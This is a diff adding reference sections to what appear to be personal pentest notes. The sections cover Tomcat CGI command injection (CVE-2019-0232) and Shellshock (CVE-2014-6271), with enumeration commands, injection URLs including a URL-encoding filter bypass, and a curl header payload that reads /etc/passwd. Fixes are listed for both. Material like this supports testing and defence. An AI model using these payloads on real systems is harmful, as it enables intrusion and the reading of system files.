@@ -580,6 +580,46 @@ python3 gitlab_13_10_2_rce.py -t http://<HOST>:8081 -u <user> -p <pass> -c '<com
 
 > GitLab pattern: scrape public/internal repos for secrets (SSH keys, tokens, hardcoded creds) → that often gives access elsewhere before you even need the RCE. Repos are a loot goldmine.
 
+### Tomcat CGI RCE — CVE-2019-0232 (reference)
+Command injection in the Tomcat **CGI Servlet** when `enableCmdLineArguments=true`. Affected: Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93. Windows-specific (batch CGI).
+
+**Enum**
+```bash
+nmap -p- -sC -Pn <HOST> --open
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<HOST>:8080/cgi/FUZZ.bat    # find e.g. welcome.bat
+```
+
+**Exploit (query string after `?&`)** — benign PoCs prove it:
+```text
+http://<HOST>:8080/cgi/welcome.bat?&dir                               # list files
+http://<HOST>:8080/cgi/welcome.bat?&set                               # env vars (PATH often unset)
+http://<HOST>:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe    # full path if PATH unset
+# URL-encode to bypass char filtering:
+http://<HOST>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+- `&` separates commands; if PATH is unset, call binaries by full path; URL-encoding bypasses filtered chars.
+- **Fix:** patch Tomcat, set `enableCmdLineArguments=false`.
+
+### Shellshock — CVE-2014-6271 (reference)
+Bash ≤ 4.3 mishandles function definitions in environment variables → arbitrary command execution, classically through **CGI scripts** (the web server passes headers into env vars that Bash evaluates).
+
+**Enum**
+```bash
+gobuster dir -u http://<HOST>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,sh
+curl -i http://<HOST>/cgi-bin/<script>.cgi      # confirm an active CGI script
+```
+
+**Confirm the vuln** — the injection vector is the magic bytes `() { :; };` in a header (commonly `User-Agent`); if what follows runs, it's vulnerable:
+```bash
+curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<HOST>/cgi-bin/<script>.cgi
+```
+Reading `/etc/passwd` is the standard confirmation. From here RCE/reverse-shell is trivial via the same header — I don't store the shell payload; use a listener and note it in the report.
+
+- **Other vectors:** any header reflected into env (`Cookie`, `Referer`), DHCP, some SSH forced-commands.
+- **Fix:** patch Bash, firewall/remove CGI, decommission EOL hosts.
+
+> CGI is legacy but still shows up. Both of these are "old box" wins — always fuzz `/cgi-bin/` and `/cgi/` and check the Bash/Tomcat version.
+
 ### My notes / lab output
 Filled in once I run this on a target.
 
